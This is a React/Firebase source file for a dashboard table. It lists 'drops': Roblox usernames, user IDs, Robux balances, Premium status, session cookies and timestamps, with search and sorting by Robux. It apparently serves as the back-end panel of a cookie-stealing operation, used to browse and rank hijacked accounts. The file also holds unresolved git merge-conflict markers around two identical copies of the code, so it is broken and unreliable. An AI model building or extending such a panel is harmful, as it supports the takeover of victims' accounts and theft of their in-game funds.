<<<<<<< HEAD
"use client"

import { useEffect, useState, useMemo } from "react"
import { ref, onValue } from "firebase/database"
import { database } from "@/lib/firebase"
import {
  Table,
  TableBody,
  TableCell,
  TableHead,
  TableHeader,
  TableRow,
} from "@/components/ui/table"
import { Badge } from "@/components/ui/badge"
import { Input } from "@/components/ui/input"
import { Skeleton } from "@/components/ui/skeleton"
import { Search, ArrowUpDown, ArrowUp, ArrowDown } from "lucide-react"
import { Button } from "@/components/ui/button"

export interface Drop {
  id: string
  user: string
  userid: string
  robux: number
  premium: boolean
  cookie: string
  time: string | number
}

type SortField = "user" | "userid" | "robux" | "premium" | "time"
type SortDirection = "asc" | "desc"

export function DropsTable() {
  const [drops, setDrops] = useState<Drop[]>([])
  const [loading, setLoading] = useState(true)
  const [search, setSearch] = useState("")
  const [sortField, setSortField] = useState<SortField>("time")
  const [sortDirection, setSortDirection] = useState<SortDirection>("desc")

  useEffect(() => {
    const dropsRef = ref(database, "drops")
    const unsubscribe = onValue(dropsRef, (snapshot) => {
      const data = snapshot.val()
      if (data) {
        const dropsArray: Drop[] = Object.entries(data).map(
          ([key, value]) => ({
            id: key,
            ...(value as Omit<Drop, "id">),
          })
        )
        setDrops(dropsArray)
      } else {
        setDrops([])
      }
      setLoading(false)
    })

    return () => unsubscribe()
  }, [])

  function handleSort(field: SortField) {
    if (sortField === field) {
      setSortDirection((prev) => (prev === "asc" ? "desc" : "asc"))
    } else {
      setSortField(field)
      setSortDirection("desc")
    }
  }

  const filteredAndSorted = useMemo(() => {
    let result = drops

    if (search) {
      const q = search.toLowerCase()
      result = result.filter(
        (drop) =>
          drop.user?.toLowerCase().includes(q) ||
          drop.userid?.toString().toLowerCase().includes(q) ||
          drop.cookie?.toLowerCase().includes(q)
      )
    }

    result.sort((a, b) => {
      let comparison = 0
      switch (sortField) {
        case "user":
          comparison = (a.user || "").localeCompare(b.user || "")
          break
        case "userid":
          comparison = (a.userid || "").localeCompare(b.userid || "")
          break
        case "robux":
          comparison = (Number(a.robux) || 0) - (Number(b.robux) || 0)
          break
        case "premium":
          comparison = Number(a.premium || false) - Number(b.premium || false)
          break
        case "time":
          comparison = String(a.time || "").localeCompare(String(b.time || ""))
          break
      }
      return sortDirection === "asc" ? comparison : -comparison
    })

    return result
  }, [drops, search, sortField, sortDirection])

  function SortIcon({ field }: { field: SortField }) {
    if (sortField !== field) return <ArrowUpDown className="h-3.5 w-3.5 text-muted-foreground/50" />
    return sortDirection === "asc" ? (
      <ArrowUp className="h-3.5 w-3.5" />
    ) : (
      <ArrowDown className="h-3.5 w-3.5" />
    )
  }

  function formatTime(time: string | number) {
    if (!time) return "N/A"
    try {
      const date = new Date(
        typeof time === "number" ? time : isNaN(Number(time)) ? time : Number(time)
      )
      if (isNaN(date.getTime())) return String(time)
      return date.toLocaleString()
    } catch {
      return String(time)
    }
  }

  if (loading) {
    return (
      <div className="flex flex-col gap-4">
        <Skeleton className="h-9 w-full max-w-sm" />
        <div className="flex flex-col gap-2">
          {Array.from({ length: 6 }).map((_, i) => (
            <Skeleton key={i} className="h-12 w-full" />
          ))}
        </div>
      </div>
    )
  }

  return (
    <div className="flex flex-col gap-4">
      <div className="flex items-center gap-3">
        <div className="relative flex-1 max-w-sm">
          <Search className="absolute left-3 top-1/2 h-4 w-4 -translate-y-1/2 text-muted-foreground" />
          <Input
            placeholder="Search by user, userid, or cookie..."
            value={search}
            onChange={(e) => setSearch(e.target.value)}
            className="pl-9"
          />
        </div>
        <p className="text-sm text-muted-foreground">
          {filteredAndSorted.length} {filteredAndSorted.length === 1 ? "record" : "records"}
        </p>
      </div>

      <div className="rounded-lg border border-border/50 overflow-hidden">
        <Table>
          <TableHeader>
            <TableRow className="bg-muted/30 hover:bg-muted/30">
              {(
                [
                  { field: "user" as SortField, label: "User" },
                  { field: "userid" as SortField, label: "User ID" },
                  { field: "robux" as SortField, label: "Robux" },
                  { field: "premium" as SortField, label: "Premium" },
                  { field: null, label: "Cookie" },
                  { field: "time" as SortField, label: "Time" },
                ] as const
              ).map(({ field, label }) => (
                <TableHead key={label}>
                  {field ? (
                    <Button
                      variant="ghost"
                      size="sm"
                      className="-ml-3 h-8 gap-1 text-xs font-semibold uppercase tracking-wider text-muted-foreground hover:text-foreground"
                      onClick={() => handleSort(field)}
                    >
                      {label}
                      <SortIcon field={field} />
                    </Button>
                  ) : (
                    <span className="text-xs font-semibold uppercase tracking-wider text-muted-foreground">
                      {label}
                    </span>
                  )}
                </TableHead>
              ))}
            </TableRow>
          </TableHeader>
          <TableBody>
            {filteredAndSorted.length === 0 ? (
              <TableRow>
                <TableCell
                  colSpan={6}
                  className="h-32 text-center text-muted-foreground"
                >
                  {search ? "No records match your search." : "No data available."}
                </TableCell>
              </TableRow>
            ) : (
              filteredAndSorted.map((drop) => (
                <TableRow key={drop.id}>
                  <TableCell className="font-medium text-foreground">
                    {drop.user || "N/A"}
                  </TableCell>
                  <TableCell className="font-mono text-sm text-muted-foreground">
                    {drop.userid || "N/A"}
                  </TableCell>
                  <TableCell>
                    <span className="font-semibold text-foreground">
                      {Number(drop.robux || 0).toLocaleString()}
                    </span>
                  </TableCell>
                  <TableCell>
                    <Badge
                      variant={drop.premium ? "default" : "secondary"}
                      className={
                        drop.premium
                          ? "bg-emerald-500/15 text-emerald-600 border-emerald-500/20 dark:text-emerald-400"
                          : ""
                      }
                    >
                      {drop.premium ? "Yes" : "No"}
                    </Badge>
                  </TableCell>
                  <TableCell>
                    <code className="rounded bg-muted px-1.5 py-0.5 text-xs font-mono text-muted-foreground max-w-[200px] truncate block">
                      {drop.cookie || "N/A"}
                    </code>
                  </TableCell>
                  <TableCell className="text-sm text-muted-foreground">
                    {formatTime(drop.time)}
                  </TableCell>
                </TableRow>
              ))
            )}
          </TableBody>
        </Table>
      </div>
    </div>
  )
}
=======
"use client"

import { useEffect, useState, useMemo } from "react"
import { ref, onValue } from "firebase/database"
import { database } from "@/lib/firebase"
import {
  Table,
  TableBody,
  TableCell,
  TableHead,
  TableHeader,
  TableRow,
} from "@/components/ui/table"
import { Badge } from "@/components/ui/badge"
import { Input } from "@/components/ui/input"
import { Skeleton } from "@/components/ui/skeleton"
import { Search, ArrowUpDown, ArrowUp, ArrowDown } from "lucide-react"
import { Button } from "@/components/ui/button"

export interface Drop {
  id: string
  user: string
  userid: string
  robux: number
  premium: boolean
  cookie: string
  time: string | number
}

type SortField = "user" | "userid" | "robux" | "premium" | "time"
type SortDirection = "asc" | "desc"

export function DropsTable() {
  const [drops, setDrops] = useState<Drop[]>([])
  const [loading, setLoading] = useState(true)
  const [search, setSearch] = useState("")
  const [sortField, setSortField] = useState<SortField>("time")
  const [sortDirection, setSortDirection] = useState<SortDirection>("desc")

  useEffect(() => {
    const dropsRef = ref(database, "drops")
    const unsubscribe = onValue(dropsRef, (snapshot) => {
      const data = snapshot.val()
      if (data) {
        const dropsArray: Drop[] = Object.entries(data).map(
          ([key, value]) => ({
            id: key,
            ...(value as Omit<Drop, "id">),
          })
        )
        setDrops(dropsArray)
      } else {
        setDrops([])
      }
      setLoading(false)
    })

    return () => unsubscribe()
  }, [])

  function handleSort(field: SortField) {
    if (sortField === field) {
      setSortDirection((prev) => (prev === "asc" ? "desc" : "asc"))
    } else {
      setSortField(field)
      setSortDirection("desc")
    }
  }

  const filteredAndSorted = useMemo(() => {
    let result = drops

    if (search) {
      const q = search.toLowerCase()
      result = result.filter(
        (drop) =>
          drop.user?.toLowerCase().includes(q) ||
          drop.userid?.toString().toLowerCase().includes(q) ||
          drop.cookie?.toLowerCase().includes(q)
      )
    }

    result.sort((a, b) => {
      let comparison = 0
      switch (sortField) {
        case "user":
          comparison = (a.user || "").localeCompare(b.user || "")
          break
        case "userid":
          comparison = (a.userid || "").localeCompare(b.userid || "")
          break
        case "robux":
          comparison = (Number(a.robux) || 0) - (Number(b.robux) || 0)
          break
        case "premium":
          comparison = Number(a.premium || false) - Number(b.premium || false)
          break
        case "time":
          comparison = String(a.time || "").localeCompare(String(b.time || ""))
          break
      }
      return sortDirection === "asc" ? comparison : -comparison
    })

    return result
  }, [drops, search, sortField, sortDirection])

  function SortIcon({ field }: { field: SortField }) {
    if (sortField !== field) return <ArrowUpDown className="h-3.5 w-3.5 text-muted-foreground/50" />
    return sortDirection === "asc" ? (
      <ArrowUp className="h-3.5 w-3.5" />
    ) : (
      <ArrowDown className="h-3.5 w-3.5" />
    )
  }

  function formatTime(time: string | number) {
    if (!time) return "N/A"
    try {
      const date = new Date(
        typeof time === "number" ? time : isNaN(Number(time)) ? time : Number(time)
      )
      if (isNaN(date.getTime())) return String(time)
      return date.toLocaleString()
    } catch {
      return String(time)
    }
  }

  if (loading) {
    return (
      <div className="flex flex-col gap-4">
        <Skeleton className="h-9 w-full max-w-sm" />
        <div className="flex flex-col gap-2">
          {Array.from({ length: 6 }).map((_, i) => (
            <Skeleton key={i} className="h-12 w-full" />
          ))}
        </div>
      </div>
    )
  }

  return (
    <div className="flex flex-col gap-4">
      <div className="flex items-center gap-3">
        <div className="relative flex-1 max-w-sm">
          <Search className="absolute left-3 top-1/2 h-4 w-4 -translate-y-1/2 text-muted-foreground" />
          <Input
            placeholder="Search by user, userid, or cookie..."
            value={search}
            onChange={(e) => setSearch(e.target.value)}
            className="pl-9"
          />
        </div>
        <p className="text-sm text-muted-foreground">
          {filteredAndSorted.length} {filteredAndSorted.length === 1 ? "record" : "records"}
        </p>
      </div>

      <div className="rounded-lg border border-border/50 overflow-hidden">
        <Table>
          <TableHeader>
            <TableRow className="bg-muted/30 hover:bg-muted/30">
              {(
                [
                  { field: "user" as SortField, label: "User" },
                  { field: "userid" as SortField, label: "User ID" },
                  { field: "robux" as SortField, label: "Robux" },
                  { field: "premium" as SortField, label: "Premium" },
                  { field: null, label: "Cookie" },
                  { field: "time" as SortField, label: "Time" },
                ] as const
              ).map(({ field, label }) => (
                <TableHead key={label}>
                  {field ? (
                    <Button
                      variant="ghost"
                      size="sm"
                      className="-ml-3 h-8 gap-1 text-xs font-semibold uppercase tracking-wider text-muted-foreground hover:text-foreground"
                      onClick={() => handleSort(field)}
                    >
                      {label}
                      <SortIcon field={field} />
                    </Button>
                  ) : (
                    <span className="text-xs font-semibold uppercase tracking-wider text-muted-foreground">
                      {label}
                    </span>
                  )}
                </TableHead>
              ))}
            </TableRow>
          </TableHeader>
          <TableBody>
            {filteredAndSorted.length === 0 ? (
              <TableRow>
                <TableCell
                  colSpan={6}
                  className="h-32 text-center text-muted-foreground"
                >
                  {search ? "No records match your search." : "No data available."}
                </TableCell>
              </TableRow>
            ) : (
              filteredAndSorted.map((drop) => (
                <TableRow key={drop.id}>
                  <TableCell className="font-medium text-foreground">
                    {drop.user || "N/A"}
                  </TableCell>
                  <TableCell className="font-mono text-sm text-muted-foreground">
                    {drop.userid || "N/A"}
                  </TableCell>
                  <TableCell>
                    <span className="font-semibold text-foreground">
                      {Number(drop.robux || 0).toLocaleString()}
                    </span>
                  </TableCell>
                  <TableCell>
                    <Badge
                      variant={drop.premium ? "default" : "secondary"}
                      className={
                        drop.premium
                          ? "bg-emerald-500/15 text-emerald-600 border-emerald-500/20 dark:text-emerald-400"
                          : ""
                      }
                    >
                      {drop.premium ? "Yes" : "No"}
                    </Badge>
                  </TableCell>
                  <TableCell>
                    <code className="rounded bg-muted px-1.5 py-0.5 text-xs font-mono text-muted-foreground max-w-[200px] truncate block">
                      {drop.cookie || "N/A"}
                    </code>
                  </TableCell>
                  <TableCell className="text-sm text-muted-foreground">
                    {formatTime(drop.time)}
                  </TableCell>
                </TableRow>
              ))
            )}
          </TableBody>
        </Table>
      </div>
    </div>
  )
}
>>>>>>> d9c409a34aecc0e321ad11ef035d23b954fa5079
